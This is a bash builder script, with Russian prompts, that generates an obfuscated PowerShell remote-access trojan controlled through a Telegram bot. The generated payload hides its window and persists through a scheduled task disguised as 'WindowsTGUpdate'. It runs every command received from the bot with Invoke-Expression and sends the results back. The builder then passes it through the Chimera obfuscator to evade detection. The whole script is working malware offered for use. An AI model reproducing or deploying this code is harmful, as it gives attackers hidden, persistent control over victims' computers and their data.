#!/bin/bash

echo "[?] Введите токен бота:"
read TOKEN
echo "[?] Введите ваш ID:"
read ID

RAW_FILE="raw_shell_tg.ps1"
cat <<EOF > $RAW_FILE
# 1. STEALTH
\$w = Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);' -Name "W" -Namespace "U" -PassThru
\$w::ShowWindow(([DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow())::GetConsoleWindow(), 0)

# 2. PERSISTENCE
\$p = "\$env:APPDATA\Microsoft\Windows\tg_sys_check.ps1"
if (!(Test-Path \$p)) {
    Get-Content \$MyInvocation.MyCommand.Definition | Set-Content \$p
    \$act = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -W Hidden -Exec Bypass -File \"\$p\""
    \$trig = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -Action \$act -Trigger \$trig -TaskName "WindowsTGUpdate" -Force
}

# 3. CORE: Telegram C2 с Traceback
\$token='$TOKEN'
\$chatId='$ID'
\$offset=0

function Send-TG { param(\$txt)
    try {
        \$limit = 4000
        if(\$txt.Length -gt \$limit) { \$txt = \$txt.Substring(0, \$limit) + "... [Текст обрезан]" }
        \$body = @{ chat_id=\$chatId; text="[\$env:COMPUTERNAME] \$txt" }
        Invoke-RestMethod -Uri "https://api.telegram.org\$token/sendMessage" -Method Post -Body \$body
    } catch {}
}

while(\$true){
    try {
        \$url = "https://api.telegram.org\$token/getUpdates?timeout=20&offset=\$(\$offset + 1)"
        \$upd = Invoke-RestMethod -Uri \$url
        foreach(\$u in \$upd.result) {
            \$offset = \$u.update_id
            if(\$u.message.text) {
                \$c = \$u.message.text
                try {
                    # Исполнение с захватом всех потоков (Error, Warning, Information)
                    \$res = (Invoke-Expression \$c 2>&1 | Out-String)
                    if ([string]::IsNullOrWhiteSpace(\$res)) { \$res = "Success (No Output)" }
                    Send-TG -txt \$res
                } catch {
                    # Подробный Traceback (где именно ошибка в PS)
                    \$err = "CRITICAL ERROR:\r\nMessage: " + \$_.Exception.Message + 
                           "\r\nScriptStack: " + \$_.ScriptStackTrace + 
                           "\r\nCategory: " + \$_.CategoryInfo.ToString()
                    Send-TG -txt \$err
                }
            }
        }
    } catch {
        # Ошибка самого цикла (например, нет интернета)
        Start-Sleep -Seconds 10
    }
    Start-Sleep -Seconds 1
}
EOF


echo "[*] Файл $RAW_FILE создан."

OUTPUT_FILE="crypt_shell_tg.ps1"

echo "[*] Запуск Chimera (Level: Insane)..."
bash chimera.sh --file $RAW_FILE --all --level 5 --prepend --output $OUTPUT_FILE

if [ $? -eq 0 ]; then
    echo "========================================"
    echo "[+] ГОТОВО! Пейлоад: $OUTPUT_FILE"
    echo "[*] Отправляйте команды своему боту в Telegram"
    echo "========================================"
    rm $RAW_FILE
else
    echo "[-] Ошибка при работе Chimera."
fi
